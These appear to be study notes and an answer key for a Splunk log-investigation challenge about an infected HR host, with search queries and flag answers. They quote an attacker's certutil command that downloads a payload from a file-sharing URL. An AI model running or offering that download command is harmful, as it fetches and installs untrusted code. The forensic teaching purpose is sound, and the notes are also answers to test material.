# Benign

> Structured cybersecurity study notes converted from the source DOCX. Commands, indicators, answers, and investigation pivots are preserved for rapid reference.

## Introduction

We will investigate host-centric logs in this challenge room to find suspicious process execution. To learn more about Splunk and how to investigate the logs, look at the rooms splunk101 and splunk201.
## Scenario: Identify and Investigate an Infected Host

One of the client's IDS indicated a potentially suspicious process execution indicating one of the hosts from the HR department was compromised. Some tools related to network information gathering / scheduled tasks were executed which confirmed the suspicion. Due to limited resources, we could only pull the process execution logs with Event ID: 4688 and ingested them into Splunk with the index win_eventlogs for further investigation.
## About the Network Information

The network is divided into three logical segments. It will help in the investigation.
## IT Department

- James
- Moin
- Katrina
## HR department

- Haroon
- Chris
- Diana
## Marketing department

- Bell
- Amelia
- Deepak
### How many logs are ingested from the month of March, 2022?

- **Answer:** 13959
### Imposter Alert: There seems to be an imposter account observed in the logs, what is the name of that user?

```text
index=win_eventlogs | stats Count(UserName) by UserName | sort UserName
```

- **Answer:** Amel1a is an imposter name for the Amelia account
### Which user from the HR department was observed to be running scheduled tasks?

```text
index=win_eventlogs | stats Count(UserName) by UserName | sort UserName
```

- The answer is obvious because the flag format includes <something>.<something> There is only one username with that format
```text
index=win_eventlogs ProcessName="C:\\Windows\\System32\\schtasks.exe"
```

- shows all the scheduled tasks run by users
```text
index=win_eventlogs ProcessName="C:\\Windows\\System32\\schtasks.exe" | table UserName CommandLine | sort -UserName
```

- Chris.Fort is the only one to create a new scheduled task
### Which user from the HR department executed a system process (LOLBIN) to download a payload from a file-sharing host.

```text
index=win_eventlogs UserName=haroon OR Chris OR diana
```

- Showed only two usernames, Chris and Haroon
- **Answer:** Haroon
### To bypass the security controls, which system process (lolbin) was used to download a payload from the internet?

```text
index=win_eventlogs UserName=haroon | stats Count(CommandLine) by CommandLine| sort -CommandLine
```

- only certutil reached out to the internet and the download did not represent any certificate file format
### What was the date that this binary was executed by the infected host? format (YYYY-MM-DD)

- index=win_eventlogs UserName=haroon CommandLine=" certutil.exe -urlcache -f - https://controlc.com/548ab556 benign.exe"
- There's only one event
### Which third-party site was accessed to download the malicious payload?

- **Answer:** controlc.com
### What is the name of the file that was saved on the host machine from the C2 server during the post-exploitation

### phase?

- **Answer:** Benign.exe
### The suspicious file downloaded from the C2 server contained malicious content with the pattern THM{..........}; what is that pattern?

- Follow the web address
### What is the URL that the infected host connected to?

- **Answer:** https://controlc.com/548ab556
